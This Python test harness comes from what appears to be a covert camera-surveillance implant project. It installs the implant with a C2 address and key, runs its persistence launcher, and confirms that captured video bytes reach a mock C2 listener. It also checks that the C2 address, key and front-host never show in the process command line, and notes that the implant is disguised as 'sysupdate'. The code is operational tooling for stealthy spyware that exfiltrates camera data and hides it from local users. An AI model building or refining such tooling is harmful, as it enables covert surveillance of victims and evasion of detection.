#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
守卫：驻留进程的命令行不得含落点（C2 地址 / front-host）与密钥，
且"改走环境变量"之后功能必须照常（C2 实收 > 0）。

为什么必须有这个守卫
--------------------
/proc/<pid>/cmdline 是 0444 世界可读——目标机上任何本地用户 ps 一下就能得到
C2 地址；front:// 形态下 --front-host 是真实目标，比前置域更敏感。

最危险的失效形态是"改了但没生效"：run.sh 的 exec 行若仍拼 --sink，功能完全
正常、画面照收、部署全绿，而 C2 地址一直在 ps 里。所以本守卫必须真起进程读
/proc/<pid>/cmdline，不能只静态扫脚本源码——源码注释里提到 --sink 会造成误判。

判据分两组：
  正向 F*：真 install + 真起 run.sh，读运行期 cmdline 断言干净，且 C2 实收 > 0
  反向 R*：把 exec 行退回带 --sink 的旧写法，F 组必须变红（否则 F 组是恒绿的）
"""

import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
EXFIL = os.path.dirname(HERE)
REPO = os.path.dirname(EXFIL)
BIN = os.path.join(REPO, "agent_windows", "build", "linux", "camd")

results = []


def rec(name, ok, detail=""):
    results.append((name, bool(ok), detail))
    print("[%s] %s%s" % ("OK" if ok else "FAIL", name, ("  -- " + detail) if detail else ""))
    return bool(ok)


class C2Listener(threading.Thread):
    """扮演 C2：接受连接并累计字节数。"""

    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.total = 0
        self.conns = 0
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.port = self.sock.getsockname()[1]
        self.sock.listen(8)
        self.stop = False

    def run(self):
        while not self.stop:
            try:
                self.sock.settimeout(0.5)
                c, _ = self.sock.accept()
            except Exception:
                continue
            self.conns += 1
            c.settimeout(0.5)
            try:
                while True:
                    b = c.recv(65536)
                    if not b:
                        break
                    self.total += len(b)
            except Exception:
                pass
            finally:
                try:
                    c.close()
                except Exception:
                    pass


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def read_cmdline(pid):
    try:
        with open("/proc/%d/cmdline" % pid, "rb") as f:
            return f.read().replace(b"\0", b" ").decode("utf-8", "replace")
    except Exception as e:
        return None


def run(cmd, env=None, timeout=180):
    e = dict(os.environ)
    if env:
        e.update(env)
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True,
                           timeout=timeout, env=e)
        return p.returncode, p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return 124, "TIMEOUT"


def main():
    if not os.path.exists(BIN):
        print("[FATAL] 缺二进制: %s（先 make -C agent_windows）" % BIN)
        return 1

    tmp = tempfile.mkdtemp(prefix="okcmd_")
    ok_sh = os.path.join(tmp, "onekey.sh")
    pfx = os.path.join(tmp, "root")

    # 生成一键脚本
    rc, out = run("cd %s && python3 21_exfil/make_onekey.py amd64=%s -o %s"
                  % (REPO, BIN, ok_sh), timeout=300)
    if not rec("G1 生成一键脚本", rc == 0 and os.path.exists(ok_sh), out[-200:]):
        return 1

    c2 = C2Listener()
    c2.start()
    c2addr = "127.0.0.1:%d" % c2.port

    key = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
    # 保证前后 16 字节不同（相同会被 camd 拒绝，且报错看不出成因）
    key = "a" * 16 + "b" * 16 + "c" * 16 + "d" * 16
    key = ("0123456789abcdef" + "fedcba9876543210" +
           "0011223344556677" + "8899aabbccddeeff")

    rc, out = run("PREFIX=%s sh %s install --c2 %s --key %s --backend v4l2"
                  % (pfx, ok_sh, c2addr, key), timeout=300)
    ok_inst = rec("G2 install 完成", rc == 0, out[-300:])

    # 落点名由伪装层决定（实测已变为 sysupdate 而非 camd），硬编码路径会在
    # 改名后永远找不到、却仍显示"已清理"——正是恒绿守卫的典型形态。必须从
    # install 输出解析真实路径；解析不到即失败，绝不静默放过。
    mc = re.search(r"配置写入 (\S+)", out)
    mr = re.search(r"启动器已写入 (\S+)", out)
    conf = mc.group(1).split("（")[0] if mc else ""
    run_sh = mr.group(1).split("（")[0] if mr else ""
    if not conf or not run_sh:
        rec("G3 解析出 conf/run.sh 真实路径", False,
            "conf=%r run_sh=%r" % (conf, run_sh))
        return 1
    rec("G3 conf/run.sh 落盘", os.path.exists(conf) and os.path.exists(run_sh),
        "conf=%s run_sh=%s" % (conf, run_sh))

    # 试运行是 env 路径的第一道功能验证（install 内部已跑，此处看字节数）
    # install 输出格式是「试运行已送达 C2（427520 字节信元」，不是 bytes_out=。
    # 按真实文案解析；解析不到必须判失败，否则"没验到"会冒充"验过"。
    m = re.search(r"送达 C2（(\d+)\s*字节", out)
    trial = int(m.group(1)) if m else 0
    rec("G4 试运行经环境变量送达 C2（bytes_out>0）", trial > 0, "bytes_out=%d" % trial)

    # ---- 运行期 cmdline 检查 ----
    base_before = c2.total
    proc = subprocess.Popen(["sh", run_sh], stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid)
    pid = proc.pid
    time.sleep(3)

    cmdline = read_cmdline(pid)
    alive = proc.poll() is None
    rec("G5 驻留进程存活（用于读 cmdline）", alive and cmdline is not None,
        "pid=%s" % pid)

    if cmdline is None:
        cmdline = ""

    hostpart = c2addr.split(":")[0]
    rec("F1 cmdline 不含 C2 地址", c2addr not in cmdline and hostpart not in cmdline,
        "cmdline=%r" % cmdline[:160])
    rec("F2 cmdline 不含密钥", key not in cmdline)
    rec("F3 cmdline 不含 --sink", "--sink" not in cmdline)
    rec("F4 cmdline 不含 --front-host", "--front-host" not in cmdline)
    rec("F5 cmdline 不含 --key", "--key" not in cmdline)

    # 功能不能坏：env 方式必须真的把画面送出去
    time.sleep(3)
    got = c2.total - base_before
    rec("F6 环境变量方式功能正常（C2 实收>0）", got > 0, "C2 实收=%d 字节" % got)

    # 环境变量通路确实被用上（environ 里应有 CAMD_SINK）
    try:
        with open("/proc/%d/environ" % pid, "rb") as f:
            envb = f.read().decode("utf-8", "replace")
    except Exception:
        envb = ""
    rec("F7 CAMD_SINK 经环境注入", "CAMD_SINK=" in envb)

    try:
        os.killpg(os.getpgid(pid), signal.SIGKILL)
    except Exception:
        pass
    proc.wait(timeout=10)

    # ---- 反向：退回旧写法，F 组必须变红 ----
    src = open(run_sh).read()
    # 按 exec 行整体匹配，而不是死记整行字面量：run.sh 后来加了 $ROOTARG
    # （假根隔离，与试运行同源），整行变了，按字面量匹配的注入点会找不到，
    # R1 随即退化成"永远不注入、也不报错"的恒绿反向。
    # 注入必须保留原有的 $ROOTARG，否则反向用例自己会把驻留写回真实根。
    m_exec = re.search(r'^exec "\$BIN_ABS".*$', src, re.M)
    if m_exec:
        line = m_exec.group(0)
        newline = line.replace('exec "$BIN_ABS"',
                               'exec "$BIN_ABS" --sink "$CAMD_SINK"', 1)
        mut = src.replace(line, newline, 1)
        open(run_sh, "w").write(mut)
        base2 = c2.total
        p2 = subprocess.Popen(["sh", run_sh], stdout=subprocess.DEVNULL,
                              stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
        time.sleep(3)
        cl2 = read_cmdline(p2.pid) or ""
        rec("R1 退回旧写法后 cmdline 暴露 C2（证明 F1 有鉴别力）",
            c2addr in cl2 or hostpart in cl2, "cmdline=%r" % cl2[:160])
        try:
            os.killpg(os.getpgid(p2.pid), signal.SIGKILL)
        except Exception:
            pass
        p2.wait(timeout=10)
        open(run_sh, "w").write(src)
    else:
        rec("R1 反向注入点未找到（exec 行与预期不符）", False)

    # 清理
    run("PREFIX=%s sh %s uninstall" % (pfx, ok_sh), timeout=120)
    shutil.rmtree(tmp, ignore_errors=True)

    bad = [n for n, o, _ in results if not o]
    print("\n总计: %d  通过: %d  失败: %d" % (len(results), len(results) - len(bad), len(bad)))
    if bad:
        print("失败项: %s" % ", ".join(bad))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
